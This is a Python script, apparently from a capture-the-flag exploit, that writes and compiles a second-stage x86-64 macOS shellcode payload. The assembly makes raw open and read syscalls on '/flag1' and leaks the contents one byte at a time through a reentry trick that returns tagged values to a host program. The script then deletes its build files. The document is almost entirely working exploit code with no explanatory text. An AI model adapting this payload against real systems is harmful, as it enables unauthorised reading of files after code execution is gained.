#!/usr/bin/env python

import subprocess

payload = """
.intel_syntax noprefix
.text

#define PUSH_KERNEL_REGS push rcx; push r11; push r10
#define POP_KERNEL_REGS pop r10; pop r11; pop rcx
#define DEFINE_POSIX_SCALL(name, number) .globl name; name: PUSH_KERNEL_REGS; mov rax, 0x2000000; add rax, number; mov r10, rcx; syscall; POP_KERNEL_REGS; ret

.macro putchar chr
    lea rax, [rip+3f]
    mov qword ptr [rip+reentry_function], rax
    movabs rax, 0xFFFF000000000000+\chr
    ret
3:
.endmacro

.macro putchar_rdi
    lea rax, [rip+3f]
    mov qword ptr [rip+reentry_function], rax
    movabs rax, 0xFFFF000000000000
    add rax, rdi
    ret
3:
.endmacro

.globl start
start:
    cmp qword ptr [rip+reentry_function], 0
    je 3f
    mov rax, qword ptr [rip+reentry_function]
    jmp rax
3:
    lea rdi, [rip+filename]
    xor rsi, rsi
    xor rdx, rdx
    call open
    mov edi, eax
    lea rsi, [rip+buf]
    mov rdx, 1024
    call read
    
4:
    lea rax, [rip+ctr]
    mov rdi, qword ptr [rax]
    cmp rdi, 0
    je 5f
    dec rdi
    mov qword ptr [rax], rdi
    lea rax, [rip+buf]
    add rax, 199
    sub rax, rdi
    movzx rdi, byte ptr [rax]
    putchar_rdi
    jmp 4b
    
5:
    // Return value
    movabs rax, 0xFFFF000000000000
    ret
    
DEFINE_POSIX_SCALL(open, 5)
DEFINE_POSIX_SCALL(read, 3)

.data

.globl reentry_function
reentry_function:
    .quad 0

.globl filename
filename:
    .asciz "/flag1"
    
.globl ctr
ctr:
    .quad 200

.globl buf
buf:
    .quad 0
    
"""

# Write payload
f = open("stage2_macOS.S", "w+")
f.write(payload)
f.close()

# Build payload
subprocess.check_call(['clang', '-nostdlib', '-static', 'stage2_macOS.S', '-o', 'stage2_macOS.o'])
subprocess.check_call(['gobjcopy', '-O', 'binary', 'stage2_macOS.o', 'stage2_macOS.bin'])

# Delete the generated source and binary
subprocess.check_call(['rm', 'stage2_macOS.S'])
subprocess.check_call(['rm', 'stage2_macOS.o'])
